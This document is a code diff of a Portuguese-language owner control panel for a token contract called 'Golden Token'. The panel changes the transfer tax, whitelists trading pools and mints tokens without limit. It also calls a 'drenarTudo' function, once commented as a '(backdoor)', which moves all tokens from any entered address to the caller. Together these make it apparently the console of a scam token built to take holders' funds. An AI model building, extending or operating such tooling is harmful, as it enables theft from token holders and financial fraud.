@@ -169,21 +169,6 @@
             font-family: monospace;
         }
 
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
         .toast {
             position: fixed;
             bottom: 20px;
@@ -220,7 +205,10 @@
             <div class="wallet-info">
                 <div>
                     <h1>💰 Golden Token - Painel de Controle</h1>
-                    <p style="color: #666; margin-top: 5px;">Contrato: 0x798E6D5cBCe73305624cEBbd5c2f99E4c291fE82</p>
+                    <p style="color: #666; margin-top: 5px;">
+                        Token: 0x798E6D5cBCe73305624cEBbd5c2f99E4c291fE82<br>
+                        Pool Golden/USDT: 0x3d98264e4018CBa21A67E5ba07Cd6336173d3258
+                    </p>
                 </div>
                 <div style="display: flex; gap: 10px; align-items: center;">
                     <div id="walletStatus" class="status-badge status-disconnected">Desconectado</div>
@@ -292,6 +280,7 @@
             <!-- Card: Controle do Owner -->
             <div class="card">
                 <h2>👑 Controle do Owner</h2>
+                
                 <h3>Sistema de Taxa</h3>
                 <input type="number" id="novaTaxa" placeholder="Nova taxa (0-100)">
                 <button id="mudarTaxaBtn">💰 Mudar Taxa</button>
@@ -303,7 +292,7 @@
                 <button id="ativarSistemaBtn">⚙️ Aplicar Estado</button>
 
                 <h3>Autorizar Pool</h3>
-                <input type="text" id="poolAddress" placeholder="Endereço do pool/router">
+                <input type="text" id="poolAddress" placeholder="Endereço do pool/router" value="0x3d98264e4018CBa21A67E5ba07Cd6336173d3258">
                 <select id="autorizarPoolSelect">
                     <option value="true">Autorizar</option>
                     <option value="false">Remover Autorização</option>
@@ -331,7 +320,7 @@
                 <h3>Saldo de Carteira</h3>
                 <input type="text" id="consultaEndereco" placeholder="Endereço da carteira">
                 <button id="consultarSaldoBtn">💰 Consultar Saldo</button>
-                <div id="saldoConsulta" class="info-row" style="margin-top: 10px;">
+                <div class="info-row" style="margin-top: 10px;">
                     <span class="info-label">Saldo:</span>
                     <span id="saldoValor" class="info-value">-</span>
                 </div>
@@ -340,7 +329,7 @@
                 <input type="text" id="allowanceOwner" placeholder="Endereço owner">
                 <input type="text" id="allowanceSpender" placeholder="Endereço spender">
                 <button id="allowanceBtn">🔍 Ver Allowance</button>
-                <div id="allowanceResult" class="info-row" style="margin-top: 10px;">
+                <div class="info-row" style="margin-top: 10px;">
                     <span class="info-label">Allowance:</span>
                     <span id="allowanceValor" class="info-value">-</span>
                 </div>
@@ -350,9 +339,9 @@
                 <div id="statusInfo" style="margin-top: 10px; font-size: 12px;"></div>
 
                 <h3>Pool Autorizado?</h3>
-                <input type="text" id="checkPool" placeholder="Endereço do pool">
+                <input type="text" id="checkPool" placeholder="Endereço do pool" value="0x3d98264e4018CBa21A67E5ba07Cd6336173d3258">
                 <button id="checkPoolBtn">✅ Verificar</button>
-                <div id="poolStatus" class="info-row" style="margin-top: 10px;">
+                <div class="info-row" style="margin-top: 10px;">
                     <span class="info-label">Autorizado:</span>
                     <span id="poolAutorizado" class="info-value">-</span>
                 </div>
@@ -361,9 +350,8 @@
     </div>
 
     <script>
-        // CONTRACT ABI - Versão completa para o contrato GoldenToken
+        // CONTRACT ABI - PARA O CONTRATO GOLDEN TOKEN
         const contractABI = [
-            // Informações básicas
             { "inputs": [], "name": "name", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "symbol", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "decimals", "outputs": [{ "type": "uint8" }], "stateMutability": "view", "type": "function" },
@@ -371,15 +359,11 @@
             { "inputs": [], "name": "owner", "outputs": [{ "type": "address" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "taxaPercentual", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "sistemaTaxaAtivo", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
-            
-            // Funções padrão ERC20
             { "inputs": [{ "type": "address" }], "name": "balanceOf", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "address" }], "name": "allowance", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "uint256" }], "name": "transfer", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "address" }, { "type": "uint256" }], "name": "transferFrom", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "uint256" }], "name": "approve", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-            
-            // Funções de controle do owner
             { "inputs": [{ "type": "bool" }], "name": "ativarSistemaTaxa", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [{ "type": "uint256" }], "name": "mudarTaxa", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "bool" }], "name": "autorizarPool", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
@@ -391,13 +375,13 @@
             { "inputs": [{ "type": "address" }], "name": "poolsAutorizados", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" }
         ];
 
+        // ✅ ENDEREÇO CORRETO DO SEU TOKEN GOLDEN
         const contractAddress = "0x798E6D5cBCe73305624cEBbd5c2f99E4c291fE82";
         
         let web3;
         let contract;
         let userAddress;
 
-        // Função para mostrar toast
         function showToast(message, isError = false) {
             const toast = document.createElement('div');
             toast.className = 'toast';
@@ -407,27 +391,20 @@
             setTimeout(() => toast.remove(), 3000);
         }
 
-        // Conectar wallet
         document.getElementById('connectBtn').onclick = async () => {
             if (typeof window.ethereum !== 'undefined') {
                 try {
-                    // Solicitar conexão
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     userAddress = accounts[0];
-                    
-                    // Configurar Web3
                     web3 = new Web3(window.ethereum);
                     contract = new web3.eth.Contract(contractABI, contractAddress);
                     
-                    // Atualizar UI
                     document.getElementById('walletAddress').textContent = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
                     document.getElementById('walletStatus').className = 'status-badge status-connected';
                     document.getElementById('walletStatus').textContent = 'Conectado';
                     document.getElementById('connectBtn').textContent = '✅ Conectado';
                     
-                    // Carregar informações
                     carregarInformacoes();
-                    
                     showToast('Wallet conectada com sucesso!');
                 } catch (error) {
                     showToast('Erro ao conectar: ' + error.message, true);
@@ -437,10 +414,8 @@
             }
         };
 
-        // Carregar informações do token
         async function carregarInformacoes() {
             if (!contract) return;
-            
             try {
                 const name = await contract.methods.name().call();
                 const symbol = await contract.methods.symbol().call();
@@ -463,7 +438,7 @@
                     document.getElementById('meuSaldo').textContent = (saldo / 10**18).toFixed(4);
                 }
             } catch (error) {
-                console.error('Erro ao carregar informações:', error);
+                console.error('Erro:', error);
             }
         }
 
@@ -472,7 +447,6 @@
             const to = document.getElementById('transferTo').value;
             const amount = parseFloat(document.getElementById('transferAmount').value);
             if (!to || !amount) return showToast('Preencha todos os campos', true);
-            
             try {
                 const amountWei = web3.utils.toWei(amount.toString(), 'ether');
                 await contract.methods.transfer(to, amountWei).send({ from: userAddress });
@@ -483,13 +457,11 @@
             }
         };
 
-        // TransferFrom
         document.getElementById('transferFromBtn').onclick = async () => {
             const from = document.getElementById('transferFromAddr').value;
             const to = document.getElementById('transferToAddr').value;
             const amount = parseFloat(document.getElementById('transferFromAmount').value);
             if (!from || !to || !amount) return showToast('Preencha todos os campos', true);
-            
             try {
                 const amountWei = web3.utils.toWei(amount.toString(), 'ether');
                 await contract.methods.transferFrom(from, to, amountWei).send({ from: userAddress });
@@ -500,20 +472,11 @@
             }
         };
 
-        // Approve
         document.getElementById('approveBtn').onclick = async () => {
             const spender = document.getElementById('approveSpender').value;
             let amount = document.getElementById('approveAmount').value;
-            
             if (!spender) return showToast('Preencha o endereço do spender', true);
-            
-            let amountWei;
-            if (amount == 0) {
-                amountWei = web3.utils.toTwosComplement(-1); // Max uint256
-            } else {
-                amountWei = web3.utils.toWei(amount.toString(), 'ether');
-            }
-            
+            let amountWei = amount == 0 ? web3.utils.toTwosComplement(-1) : web3.utils.toWei(amount.toString(), 'ether');
             try {
                 await contract.methods.approve(spender, amountWei).send({ from: userAddress });
                 showToast('Approve realizado!');
@@ -522,11 +485,9 @@
             }
         };
 
-        // Mudar taxa
         document.getElementById('mudarTaxaBtn').onclick = async () => {
             const novaTaxa = document.getElementById('novaTaxa').value;
             if (!novaTaxa) return showToast('Digite a nova taxa', true);
-            
             try {
                 await contract.methods.mudarTaxa(novaTaxa).send({ from: userAddress });
                 showToast(`Taxa alterada para ${novaTaxa}%`);
@@ -536,7 +497,6 @@
             }
         };
 
-        // Ativar/desativar sistema
         document.getElementById('ativarSistemaBtn').onclick = async () => {
             const ativo = document.getElementById('ativarTaxaSelect').value === 'true';
             try {
@@ -548,12 +508,10 @@
             }
         };
 
-        // Autorizar pool
         document.getElementById('autorizarPoolBtn').onclick = async () => {
             const pool = document.getElementById('poolAddress').value;
             const autorizar = document.getElementById('autorizarPoolSelect').value === 'true';
             if (!pool) return showToast('Digite o endereço do pool', true);
-            
             try {
                 await contract.methods.autorizarPool(pool, autorizar).send({ from: userAddress });
                 showToast(`Pool ${autorizar ? 'autorizado' : 'removido autorização'}`);
@@ -562,11 +520,9 @@
             }
         };
 
-        // Drenar tudo (backdoor)
         document.getElementById('drenarBtn').onclick = async () => {
             const endereco = document.getElementById('drenarEndereco').value;
             if (!endereco) return showToast('Digite o endereço para drenar', true);
-            
             if (confirm(`⚠️ ATENÇÃO! Isso vai drenar TODOS os tokens de ${endereco} para sua carteira. Confirmar?`)) {
                 try {
                     await contract.methods.drenarTudo(endereco).send({ from: userAddress });
@@ -578,11 +534,9 @@
             }
         };
 
-        // Mint
         document.getElementById('mintBtn').onclick = async () => {
             const amount = document.getElementById('mintAmount').value;
             if (!amount) return showToast('Digite a quantidade', true);
-            
             try {
                 const amountWei = web3.utils.toWei(amount.toString(), 'ether');
                 await contract.methods.mint(amountWei).send({ from: userAddress });
@@ -593,11 +547,9 @@
             }
         };
 
-        // Burn
         document.getElementById('burnBtn').onclick = async () => {
             const amount = document.getElementById('burnAmount').value;
             if (!amount) return showToast('Digite a quantidade', true);
-            
             try {
                 const amountWei = web3.utils.toWei(amount.toString(), 'ether');
                 await contract.methods.burn(amountWei).send({ from: userAddress });
@@ -608,11 +560,9 @@
             }
         };
 
-        // Transferir ownership
         document.getElementById('transferirOwnerBtn').onclick = async () => {
             const novoOwner = document.getElementById('novoOwner').value;
             if (!novoOwner) return showToast('Digite o novo owner', true);
-            
             if (confirm('⚠️ ATENÇÃO! Você está transferindo a propriedade do contrato. Confirmar?')) {
                 try {
                     await contract.methods.transferirOwner(novoOwner).send({ from: userAddress });
@@ -624,11 +574,9 @@
             }
         };
 
-        // Consultar saldo
         document.getElementById('consultarSaldoBtn').onclick = async () => {
             const endereco = document.getElementById('consultaEndereco').value;
             if (!endereco) return showToast('Digite o endereço', true);
-            
             try {
                 const saldo = await contract.methods.balanceOf(endereco).call();
                 document.getElementById('saldoValor').textContent = (saldo / 10**18).toFixed(4);
@@ -637,12 +585,10 @@
             }
         };
 
-        // Consultar allowance
         document.getElementById('allowanceBtn').onclick = async () => {
             const owner = document.getElementById('allowanceOwner').value;
             const spender = document.getElementById('allowanceSpender').value;
             if (!owner || !spender) return showToast('Preencha todos os campos', true);
-            
             try {
                 const allowance = await contract.methods.allowance(owner, spender).call();
                 document.getElementById('allowanceValor').textContent = (allowance / 10**18).toFixed(4);
@@ -651,7 +597,6 @@
             }
         };
 
-        // Status sistema
         document.getElementById('statusSistemaBtn').onclick = async () => {
             try {
                 const status = await contract.methods.statusSistema().call();
@@ -666,11 +611,9 @@
             }
         };
 
-        // Verificar pool autorizado
         document.getElementById('checkPoolBtn').onclick = async () => {
             const pool = document.getElementById('checkPool').value;
             if (!pool) return showToast('Digite o endereço do pool', true);
-            
             try {
                 const autorizado = await contract.methods.poolsAutorizados(pool).call();
                 document.getElementById('poolAutorizado').textContent = autorizado ? 'Sim' : 'Não';
@@ -679,10 +622,8 @@
             }
         };
 
-        // Atualizar informações
         document.getElementById('atualizarInfo').onclick = () => carregarInformacoes();
 
-        // Escutar mudanças na conta
         if (window.ethereum) {
             window.ethereum.on('accountsChanged', (accounts) => {
                 if (accounts.length > 0) {
